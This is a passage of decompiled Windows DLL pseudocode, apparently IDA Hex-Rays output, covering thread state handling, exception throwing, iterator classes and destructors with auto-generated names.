  int v7; // [esp+34h] [ebp-4h]

  sub_10012C8B(this + 3, v5);
  v7 = 0;
  v2 = this[22];
  if ( !v2 )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  if ( v2 == 4 )
  {
    sub_1000DEEF(v6);
    _CxxThrowException(v6, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  if ( v2 <= 3 )
  {
    sub_1000F4FF(this);
    this[22] = 2;
  }
  v7 = -1;
  return sub_10012CBF(v5);
}
// 1002A954: using guessed type _DWORD var_1C[2];
// 1002A954: using guessed type _DWORD pExceptionObject[3];
// 1002A954: using guessed type _DWORD var_14[4];

//----- (1002A9CC) --------------------------------------------------------
char __thiscall sub_1002A9CC(int *this)
{
  char v2; // bl
  int v3; // eax
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v6[2]; // [esp+1Ch] [ebp-1Ch] BYREF
  _DWORD v7[4]; // [esp+24h] [ebp-14h] BYREF
  int v8; // [esp+34h] [ebp-4h]

  sub_10012C8B(this + 3, v6);
  v2 = 0;
  v8 = 0;
  v3 = this[22];
  if ( !v3 )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  if ( v3 == 4 )
  {
    sub_1000DEEF(v7);
    _CxxThrowException(v7, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  if ( v3 > 3 )
    goto LABEL_6;
  if ( sub_1000F485(this) )
  {
    this[22] = 3;
    v2 = 1;
LABEL_6:
    v8 = -1;
    sub_10012CBF(v6);
    return v2;
  }
  v8 = -1;
  sub_10012CBF(v6);
  return 0;
}
// 1002A9CC: using guessed type _DWORD var_1C[2];
// 1002A9CC: using guessed type _DWORD pExceptionObject[3];
// 1002A9CC: using guessed type _DWORD var_14[4];

//----- (1002AA5D) --------------------------------------------------------
void __thiscall sub_1002AA5D(int *this, int a2, char a3)
{
  int v4; // eax
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-20h] BYREF
  _DWORD v6[4]; // [esp+1Ch] [ebp-14h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  if ( this[22] < 5 )
  {
    sub_10012C8B(this + 3, v6);
    v7 = 0;
    v4 = this[22];
    if ( !v4 )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
    if ( v4 == 4 )
    {
      sub_1000DEEF(&a3);
      _CxxThrowException(&a3, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    v7 = -1;
    if ( v4 < 5 )
    {
      sub_10012CBF(v6);
      sub_10014CC5((int)this, a2, a3);
    }
    else
    {
      sub_10012CBF(v6);
    }
  }
}
// 1002AA5D: using guessed type _DWORD var_14[4];
// 1002AA5D: using guessed type _DWORD pExceptionObject[3];

//----- (1002AAE9) --------------------------------------------------------
void __thiscall sub_1002AAE9(int *this, DWORD dwExitCode)
{
  int v3; // eax
  _DWORD v4[3]; // [esp+10h] [ebp-20h] BYREF
  _DWORD pExceptionObject[4]; // [esp+1Ch] [ebp-14h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  v4[2] = this;
  v6 = 0;
  sub_10012C8B(this + 3, v4);
  LOBYTE(v6) = 1;
  if ( this[22] == 4 )
  {
    sub_1000DEEF(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  LOBYTE(v6) = 0;
  sub_10012CBF(v4);
  v6 = -1;
  v3 = this[22];
  if ( v3 == 3 || v3 == 2 || v3 == 1 )
  {
    sub_1000F368(this, dwExitCode);
    sub_1002AC27(this);
    this[22] = 7;
  }
}
// 1002AAE9: using guessed type _DWORD pExceptionObject[4];

//----- (1002AB7A) --------------------------------------------------------
void __thiscall sub_1002AB7A(int *this, int a2)
{
  int v3; // eax
  _DWORD v4[3]; // [esp+10h] [ebp-24h] BYREF
  int pExceptionObject; // [esp+1Ch] [ebp-18h] BYREF
  char v6; // [esp+23h] [ebp-11h]
  int v7; // [esp+30h] [ebp-4h]

  v4[2] = this;
  sub_10012C8B(this + 3, v4);
  v7 = 0;
  if ( this[22] == 4 )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v7 = -1;
  sub_10012CBF(v4);
  v6 = 0;
  v3 = this[22];
  if ( v3 == 3 || v3 == 2 || v3 == 1 )
  {
    v7 = 1;
    if ( this[22] == 3 )
    {
      sub_1002A5FD((int)this, 5000);
      v6 = 1;
    }
    v7 = -1;
    if ( !v6 )
      (*(void (__thiscall **)(int *, int))(*this + 68))(this, a2);
    sub_1002AC27(this);
  }
}
// 1002AB7A: using guessed type _DWORD pExceptionObject;

//----- (1002AC27) --------------------------------------------------------
void __thiscall sub_1002AC27(_DWORD *this)
{
  _DWORD *v1; // edi
  unsigned int v2; // ebx
  int v3; // esi
  int v4; // [esp+14h] [ebp-20h] BYREF
  unsigned int v5; // [esp+18h] [ebp-1Ch]
  int i; // [esp+30h] [ebp-4h]

  v1 = this + 12;
  (*(void (__thiscall **)(_DWORD *, int *))(this[12] + 16))(this + 12, &v4);
  v2 = 0;
  for ( i = 0; v2 < v5; ++v2 )
  {
    v3 = *(_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v4 + 44))(&v4, v2);
    sub_10012EE3(v3);
  }
  (*(void (__thiscall **)(_DWORD *))(*v1 + 28))(v1);
  i = -1;
  sub_1002BA12((int)&v4);
}

//----- (1002ACB2) --------------------------------------------------------
unsigned int __stdcall StartAddress(int *lpTlsValue)
{
  _DWORD v2[3]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v3[2]; // [esp+1Ch] [ebp-1Ch] BYREF
  int v4; // [esp+34h] [ebp-4h]

  v4 = 0;
  sub_10011EED((int)v2);
  LOBYTE(v4) = 1;
  sub_1000FC57();
  if ( !TlsSetValue(dword_10095614, lpTlsValue) )
    sub_10025844();
  sub_10012C8B(lpTlsValue + 3, v3);
  LOBYTE(v4) = 2;
  if ( lpTlsValue[22] != 4 )
    lpTlsValue[22] = 3;
  LOBYTE(v4) = 1;
  sub_10012CBF(v3);
  lpTlsValue[23] = (*(int (__thiscall **)(int *))(*lpTlsValue + 76))(lpTlsValue);
  sub_10012C8B(lpTlsValue + 3, v3);
  LOBYTE(v4) = 3;
  if ( lpTlsValue[22] != 4 )
    lpTlsValue[22] = 6;
  LOBYTE(v4) = 1;
  sub_10012CBF(v3);
  LOBYTE(v4) = 0;
  sub_10011F2B(v2);
  return 0;
}
// 10025844: using guessed type void __noreturn sub_10025844(void);
// 1002ACB2: using guessed type _DWORD var_28[3];
// 1002ACB2: using guessed type _DWORD var_1C[2];

//----- (1002AE65) --------------------------------------------------------
void __thiscall sub_1002AE65(_DWORD *this)
{
  *this = &off_100748C0;
  *this = off_10072944;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 100748C0: using guessed type int (__thiscall *off_100748C0)(void *Block, char);

//----- (1002AE8A) --------------------------------------------------------
BOOL __thiscall sub_1002AE8A(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1002AEA3) --------------------------------------------------------
int __thiscall sub_1002AEA3(int this, int a2)
{
  sub_1002B4D0((void *)(this + 4), a2);
  return a2;
}

//----- (1002AED4) --------------------------------------------------------
int __thiscall sub_1002AED4(int this, int a2)
{
  sub_10007898((void *)(this + 20), a2);
  return a2;
}

//----- (1002AF05) --------------------------------------------------------
_DWORD *__thiscall sub_1002AF05(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x18u);
  if ( v3 )
    v4 = sub_1002B542(this, v3);
  else
    v4 = 0;
  sub_1002C175(a2, (int)v4);
  return a2;
}

//----- (1002AF56) --------------------------------------------------------
_DWORD *__thiscall sub_1002AF56(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1002B613(this, v3, 0);
  else
    v4 = 0;
  sub_1002C1F3(a2, (int)v4);
  return a2;
}

//----- (1002AFA9) --------------------------------------------------------
_DWORD *__thiscall sub_1002AFA9(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1002B77D(this, v3, 0);
  else
    v4 = 0;
  sub_1002C105(a2, (int)v4);
  return a2;
}

//----- (1002AFFC) --------------------------------------------------------
_DWORD *__thiscall sub_1002AFFC(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1002B613(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1002C1F3(a2, (int)v4);
  return a2;
}

//----- (1002B057) --------------------------------------------------------
_DWORD *__thiscall sub_1002B057(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1002B77D(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1002C105(a2, (int)v4);
  return a2;
}

//----- (1002B0B2) --------------------------------------------------------
_DWORD *__thiscall sub_1002B0B2(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1002B613(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1002C1F3(a2, (int)v6);
  return a2;
}

//----- (1002B127) --------------------------------------------------------
_DWORD *__thiscall sub_1002B127(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1002B77D(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1002C105(a2, (int)v6);
  return a2;
}

//----- (1002B19C) --------------------------------------------------------
void __thiscall sub_1002B19C(_DWORD *this)
{
  *this = &off_100749C4;
  *this = off_10072944;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 100749C4: using guessed type int (__thiscall *off_100749C4)(void *Block, char);

//----- (1002B1C1) --------------------------------------------------------
int *__thiscall sub_1002B1C1(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1002B503(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1002B217: variable 'v5' is possibly undefined

//----- (1002B229) --------------------------------------------------------
int *__thiscall sub_1002B229(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1002B49F(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1002B27F: variable 'v5' is possibly undefined

//----- (1002B291) --------------------------------------------------------
void __thiscall sub_1002B291(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_1002C232(v2);
}

//----- (1002B2C9) --------------------------------------------------------
void __thiscall sub_1002B2C9(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_1002C232(v3);
}

//----- (1002B304) --------------------------------------------------------
void __thiscall sub_1002B304(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_1002C232(v2);
}

//----- (1002B33C) --------------------------------------------------------
int __thiscall sub_1002B33C(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1002C144(v4);
  return v2;
}

//----- (1002B378) --------------------------------------------------------
int __thiscall sub_1002B378(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1002C232(v4);
  return v2;
}

//----- (1002B3B4) --------------------------------------------------------
void __thiscall sub_1002B3B4(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_1002C232(v1);
}

//----- (1002B3FC) --------------------------------------------------------
_DWORD *__thiscall sub_1002B3FC(_DWORD *Block, char a2)
{
  sub_1002AE65(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002B41B) --------------------------------------------------------
_DWORD *__thiscall sub_1002B41B(_DWORD *Block, char a2)
{
  *Block = &off_100748F0;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100748F0: using guessed type int (__thiscall *off_100748F0)(void *Block, char);

//----- (1002B43B) --------------------------------------------------------
_DWORD *__thiscall sub_1002B43B(_DWORD *Block, char a2)
{
  *Block = &off_10074910;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074910: using guessed type int (__thiscall *off_10074910)(void *Block, char);

//----- (1002B45B) --------------------------------------------------------
_DWORD *__thiscall sub_1002B45B(_DWORD *Block, char a2)
{
  sub_1002B19C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002B47A) --------------------------------------------------------
_DWORD *__thiscall sub_1002B47A(_DWORD *Block, char a2)
{
  *Block = &off_100749FC;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100749FC: using guessed type int (__thiscall *off_100749FC)(void *Block, char);

//----- (1002B49F) --------------------------------------------------------
int __usercall sub_1002B49F@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1002B4D0) --------------------------------------------------------
int __thiscall sub_1002B4D0(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (1002B503) --------------------------------------------------------
int __usercall sub_1002B503@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (1002B542) --------------------------------------------------------
_DWORD *__thiscall sub_1002B542(void *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100748F0;
  a2[1] = this;
  *a2 = &off_10074A1C;
  a2[2] = off_100748EC;
  a2[5] = 0;
  return result;
}
// 100748EC: using guessed type int (__thiscall *off_100748EC[2])(void *Block, char);
// 100748F0: using guessed type int (__thiscall *off_100748F0)(void *Block, char);
// 10074A1C: using guessed type int (__thiscall *off_10074A1C)(void *Block, char);

//----- (1002B57F) --------------------------------------------------------
BOOL __thiscall sub_1002B57F(int this)
{
  return *(_DWORD *)(this + 20) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1002B592) --------------------------------------------------------
BOOL __thiscall sub_1002B592(_DWORD *this)
{
  return this[5] != 0;
}

//----- (1002B59C) --------------------------------------------------------
int __thiscall sub_1002B59C(int this)
{
  _DWORD *v2; // eax
  int v4; // [esp-4h] [ebp-8h]

  v2 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
                   *(_DWORD *)(this + 4) + 4,
                   *(_DWORD *)(this + 20));
  v4 = *(_DWORD *)(this + 20);
  *(_DWORD *)(this + 12) = *v2;
  *(_BYTE *)(this + 16) = *(_BYTE *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(
                                      *(_DWORD *)(this + 4) + 20,
                                      v4);
  return this + 8;
}

//----- (1002B5CA) --------------------------------------------------------
void __thiscall sub_1002B5CA(_DWORD *this)
{
  ++this[5];
}

//----- (1002B5CE) --------------------------------------------------------
void __thiscall sub_1002B5CE(_DWORD *this)
{
  --this[5];
}

//----- (1002B5D2) --------------------------------------------------------
void __noreturn sub_1002B5D2()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E1AC(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 1002B5D2: using guessed type void __noreturn sub_1002B5D2();
// 1002B5D2: using guessed type _DWORD pExceptionObject[2];

//----- (1002B5EF) --------------------------------------------------------
void __noreturn sub_1002B5EF()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E1AC(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 1002B5EF: using guessed type void __noreturn sub_1002B5EF();
// 1002B5EF: using guessed type _DWORD pExceptionObject[2];

//----- (1002B613) --------------------------------------------------------
_DWORD *__thiscall sub_1002B613(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100749FC;
  a2[1] = this;
  *a2 = &off_10074A3C;
  a2[2] = a3;
  return result;
}
// 100749FC: using guessed type int (__thiscall *off_100749FC)(void *Block, char);
// 10074A3C: using guessed type int (__thiscall *off_10074A3C)(void *Block, char);

//----- (1002B647) --------------------------------------------------------
void __thiscall sub_1002B647(_DWORD *this)
{
  *this = &off_10074A3C;
  *this = &off_100749FC;
}
// 100749FC: using guessed type int (__thiscall *off_100749FC)(void *Block, char);
// 10074A3C: using guessed type int (__thiscall *off_10074A3C)(void *Block, char);

//----- (1002B66C) --------------------------------------------------------
bool __thiscall sub_1002B66C(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1002B683) --------------------------------------------------------
BOOL __thiscall sub_1002B683(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1002B68D) --------------------------------------------------------
int __thiscall sub_1002B68D(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1002B6C8) --------------------------------------------------------
int __thiscall sub_1002B6C8(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1002B6FE) --------------------------------------------------------
int __thiscall sub_1002B6FE(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1002B726) --------------------------------------------------------
int __thiscall sub_1002B726(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1002B761) --------------------------------------------------------
int __thiscall sub_1002B761(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1002B77D) --------------------------------------------------------
_DWORD *__thiscall sub_1002B77D(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10074910;
  a2[1] = this;
  *a2 = &off_10074A5C;
  a2[2] = a3;
  return result;
}
// 10074910: using guessed type int (__thiscall *off_10074910)(void *Block, char);
// 10074A5C: using guessed type int (__thiscall *off_10074A5C)(void *Block, char);

//----- (1002B7B1) --------------------------------------------------------
void __thiscall sub_1002B7B1(_DWORD *this)
{
  *this = &off_10074A5C;
  *this = &off_10074910;
}
// 10074910: using guessed type int (__thiscall *off_10074910)(void *Block, char);
// 10074A5C: using guessed type int (__thiscall *off_10074A5C)(void *Block, char);

//----- (1002B7D6) --------------------------------------------------------
bool __thiscall sub_1002B7D6(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1002B7ED) --------------------------------------------------------
BOOL __thiscall sub_1002B7ED(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1002B7F7) --------------------------------------------------------
int __thiscall sub_1002B7F7(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1002B832) --------------------------------------------------------
int __thiscall sub_1002B832(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1002B868) --------------------------------------------------------
int __thiscall sub_1002B868(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1002B890) --------------------------------------------------------
int __thiscall sub_1002B890(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1002B8CB) --------------------------------------------------------
int __thiscall sub_1002B8CB(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1002B8E7) --------------------------------------------------------
_DWORD *__thiscall sub_1002B8E7(_DWORD *Block, char a2)
{
  sub_1002B965(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002B907) --------------------------------------------------------
_DWORD *__thiscall sub_1002B907(_DWORD *Block, char a2)
{
  *Block = off_100748EC;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100748EC: using guessed type int (__thiscall *off_100748EC[2])(void *Block, char);

//----- (1002B927) --------------------------------------------------------
_DWORD *__thiscall sub_1002B927(_DWORD *Block, char a2)
{
  sub_1002B647(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002B946) --------------------------------------------------------
_DWORD *__thiscall sub_1002B946(_DWORD *Block, char a2)
{
  sub_1002B7B1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002B965) --------------------------------------------------------
_DWORD *__stdcall sub_1002B965(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  a1[2] = off_100748EC;
  *a1 = &off_100748F0;
  return result;
}
